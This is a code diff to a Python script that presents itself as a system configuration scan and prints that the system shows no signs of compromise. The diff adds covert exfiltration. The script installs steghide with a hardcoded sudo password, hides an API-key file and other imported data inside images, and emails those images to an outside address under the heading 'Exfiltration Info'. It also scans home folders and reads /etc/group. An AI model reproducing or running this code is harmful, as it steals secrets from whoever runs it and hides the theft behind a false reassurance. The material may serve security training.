@@ -9,9 +9,10 @@
 
 # Created by Hunter Schwager and Kyle McCarthy.
 
-from carne import asada
+from carne import asada, secret_var, send_email
 import subprocess
 import pexpect
+import smtplib
 
 # ------- QOL -------
 export_section=''
@@ -23,7 +24,7 @@ section_footer="-------------------------------------------\n"
 print("-------------Nat1 Configurations-------------")
 print("The following system scan shows no signs of system degradation or compromise.")
 print("-------------------------------------------\n")
-# ------- Code -------
+# ------- Functions -------
 
 def sudo_command(command, report):
 
@@ -35,21 +36,28 @@ def sudo_command(command, report):
     sudo_access.expect('for', timeout=1000)
     sudo_access.sendline('password')
     sudo_access.expect(pexpect.EOF)
-    sudo_access.sendline('hamiscool')
     output = sudo_access.before.decode('utf-8')
 
     return output
        
-def steg_command(command):
+def mosquito_in_amber():
 
-    sudo_access = pexpect.spawn(command)
+    sudo_access = pexpect.spawn('sudo apt install -y steghide')
     sudo_access.expect('for', timeout=1000)
     sudo_access.sendline('password')
     sudo_access.expect(pexpect.EOF)
-    sudo_access.sendline('carneasaderecipe')
-    output = sudo_access.before.decode('utf-8')
 
-    return output
+    sudo_command('sudo chmod +x steg.jpg && chmod +x dfstd.jpg', False)
+
+def steg_command(to_be_hidden, to_hide):
+    sudo_access = pexpect.spawn('sudo steghide embed -cf ' + to_hide + ' -ef ' + to_be_hidden)
+    sudo_access.expect('password', timeout=1000)
+    sudo_access.sendline('password')
+    sudo_access.expect(':')
+    sudo_access.sendline('carneasada')
+    sudo_access.expect(pexpect.EOF)
+
+# ------- Command Class -------
 
 class SkillCheck:
     command_input = []
@@ -84,8 +92,8 @@ def basicScan():
 
 # ------- Investigation -------
 
-    cron_bot = SkillCheck("Home Folder | .txt")
-    cron_bot.investigation('/home/', '*.txt', True) 
+    home_bot = SkillCheck("Home Folder | .txt")
+    home_bot.investigation('/home/', '*.txt', True) 
 
 # ------- Proficiency -------
 
@@ -104,34 +112,40 @@ def basicScan():
     group_bot = SkillCheck("Groups")
     group_bot.proficiency("cat /etc/group")
 
-# ------- Misc -------
-
-def secret_ingredient():
-    stomach_bot = SkillCheck("Secret Recipe")
-    stomach_bot.proficiency('echo', asada)
-
-    steg_command('steghide embed -cf steg.png -ef API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf')
-
 # ------- Exfiltration -------
 
-def i_am_a_stegosaurus():
-    steg_command('sudo apt install steghide')
+def secret_ingredient():
+    mosquito_in_amber()
 
-    secret_ingredient()
-    steg_command('steghide embed -cf steg.png -ef API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf')
+    steg_command('API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf', 'steg.png')
+    steg_command(asada, 'dfstd.png')
+
+def one_mail():
+    send_email(
+        'living.like.bob.was.taken@gmail.com',
+        secret_var,
+        'riwos15373@pngzero.com',
+        'Exfiltration Info',
+        'Two pictures that are not at all dinosaur related.',
+        './steg.jpg'
+    )
     
+    send_email(
+        'living.like.bob.was.taken@gmail.com',
+        secret_var,
+        'riwos15373@pngzero.com',
+        'Exfiltration Info',
+        'Two pictures that are not at all dinosaur related.',
+        './dfstd.jpg'
+    )
 
-def secret_recipe(asada):
-    
-    with open('secret_recipe.txt', 'x') as file:
-        file.write(
-
-)
 # ------- Execution -------
 
 def __main__():
+    secret_ingredient()
     basicScan()
-    i_am_a_stegosaurus()
+    one_mail()
+    
 
 
 if __name__ == '__main__':
